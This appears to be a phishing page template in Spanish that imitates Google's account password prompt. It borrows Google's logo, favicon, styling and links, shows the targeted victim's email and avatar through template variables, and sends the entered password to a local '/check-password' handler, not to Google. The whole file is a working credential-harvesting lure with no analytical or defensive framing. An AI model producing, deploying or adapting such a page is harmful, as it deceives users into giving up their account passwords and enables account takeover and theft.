<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Introduce tu contraseña - Cuenta de Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        body{font-family:'Roboto',arial,sans-serif;font-size:14px;color:#202124;margin:0;padding:0;background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;}
        .header{padding:20px;width:100%;text-align:right;}
        .header a{color:#5f6368;text-decoration:none;margin-left:16px;font-size:13px;}
        .logo{margin-top:40px;margin-bottom:20px;}
        .logo img{width:75px;height:24px;}
        .container{width:100%;max-width:450px;padding:48px 40px 36px;margin:0 auto;}
        .user-info{display:flex;align-items:center;margin-bottom:24px;padding:12px;background:#f8f9fa;border-radius:8px;}
        .avatar{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-weight:500;font-size:18px;margin-right:12px;}
        .email-display{font-size:16px;font-weight:500;flex-grow:1;}
        .change-account{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500;}
        .change-account:hover{text-decoration:underline;}
        .title{font-size:24px;font-weight:400;line-height:1.3333;margin-bottom:36px;}
        .input-container{margin-bottom:24px;}
        .google-input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box;}
        .google-input:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px;}
        .password-options{display:flex;align-items:center;justify-content:space-between;margin-bottom:48px;}
        .show-password{display:flex;align-items:center;}
        .show-password input{margin-right:8px;}
        .forgot-password{color:#1a73e8;text-decoration:none;font-weight:500;}
        .forgot-password:hover{text-decoration:underline;}
        .error-message{color:#d93025;font-size:14px;margin-bottom:20px;background:#fce8e6;padding:12px;border-radius:4px;}
        .button-group{display:flex;justify-content:space-between;align-items:center;}
        .back-button{color:#1a73e8;text-decoration:none;padding:10px 8px;border-radius:4px;font-weight:500;}
        .back-button:hover{background:#f6fafe;}
        .next-button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;min-width:88px;}
        .next-button:hover{background:#0d62d9;}
        @media (max-width:480px){.container{padding:24px;}}
    </style>
</head>
<body>
    <div class="header">
        <a href="https://accounts.google.com/signup/v2/createaccount">Crear cuenta</a>
        <a href="https://www.google.com/intl/es/gmail/about/">Gmail</a>
        <a href="https://www.google.com/imghp">Imágenes</a>
    </div>
    
    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google">
    </div>
    
    <div class="container">
        <div class="user-info">
            <div class="avatar" style="background-color: {{ avatar_color }};">{{ first_letter }}</div>
            <div class="email-display">{{ email }}</div>
            <a href="/" class="change-account">Cambiar de cuenta</a>
        </div>
        
        <div class="title">Introduce tu contraseña</div>
        
        <form action="/check-password" method="post">
            <div class="input-container">
                <input type="password" class="google-input" name="password" placeholder="Introduce tu contraseña" required autofocus id="passwordInput">
            </div>
            
            {% if error_message %}
            <div class="error-message">{{ error_message }}</div>
            {% endif %}
            
            <div class="password-options">
                <div class="show-password">
                    <input type="checkbox" id="showPassword">
                    <label for="showPassword">Mostrar contraseña</label>
                </div>
                <a href="https://accounts.google.com/signin/recovery" class="forgot-password" target="_blank">¿Has olvidado tu contraseña?</a>
            </div>
            
            <div class="button-group">
                <a href="/" class="back-button">Atrás</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>
    
    <script>
        document.getElementById('showPassword').addEventListener('change', function() {
            document.getElementById('passwordInput').type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
